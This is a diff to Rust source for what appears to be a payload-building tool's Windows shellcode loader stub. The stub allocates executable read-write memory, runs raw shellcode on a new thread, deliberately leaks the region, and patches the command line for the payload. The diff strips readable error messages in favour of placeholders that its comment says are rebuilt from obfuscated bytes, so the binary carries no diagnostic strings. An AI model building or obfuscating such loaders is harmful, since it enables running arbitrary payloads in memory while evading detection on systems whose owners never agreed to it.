@@ -16,15 +16,10 @@ use windows::Win32::System::Threading::{
 /// Entry point signature of the shellcode (returns the process exit code).
 type ShellcodeEntry = unsafe extern "system" fn() -> u32;
 
-/// Errors produced while running shellcode.
-#[derive(Debug, thiserror::Error)]
-enum ShellcodeError {
-    #[error("the payload is empty")]
-    Empty,
-    #[error("could not allocate executable memory (status 0x{0:08x})")]
-    AllocateFailed(i32),
-    #[error("could not create the execution thread")]
-    ThreadCreationFailed,
+/// Appends the NTSTATUS to a label (which is rebuilt from obfuscated bytes at
+/// the call site, so this literal carries no diagnostic text).
+fn nt_error(label: String, status: i32) -> String {
+    format!("{label} (0x{:08x})", status as u32)
 }
 
 /// Context passed to the thread that runs the shellcode.
@@ -47,9 +42,9 @@ unsafe extern "system" fn shellcode_trampoline(ctx: *mut c_void) -> u32 {
 ///
 /// The region is intentionally leaked: the stub waits for the thread, but the
 /// shellcode may have spawned work that outlives it.
-fn run_shellcode(shellcode: &[u8]) -> Result<i32, ShellcodeError> {
+fn run_shellcode(shellcode: &[u8]) -> Result<i32, String> {
     if shellcode.is_empty() {
-        return Err(ShellcodeError::Empty);
+        return Err($MSG_SHELLCODE_EMPTY$);
     }
 
     unsafe {
@@ -65,7 +60,7 @@ fn run_shellcode(shellcode: &[u8]) -> Result<i32, ShellcodeError> {
             PAGE_EXECUTE_READWRITE.0,
         );
         if status < 0 {
-            return Err(ShellcodeError::AllocateFailed(status));
+            return Err(nt_error($MSG_SHELLCODE_ALLOCATE_FAILED$, status));
         }
         crate::tech_dbg!(
             "reflective_loading",
@@ -88,7 +83,7 @@ fn run_shellcode(shellcode: &[u8]) -> Result<i32, ShellcodeError> {
         )
         .map_err(|_| {
             drop(Box::from_raw(ctx));
-            ShellcodeError::ThreadCreationFailed
+            $MSG_SHELLCODE_THREAD_FAILED$
         })?;
         crate::tech_dbg!("reflective_loading", "shellcode thread started");
 
@@ -121,5 +116,5 @@ fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
     // <runtime args>` first, so shellcode that reads it (via `GetCommandLineW`)
     // sees the configured `build.payloads.<name>.args`.
     crate::patch_command_line()?;
-    run_shellcode(image).map_err(|e| e.to_string())
+    run_shellcode(image)
 }
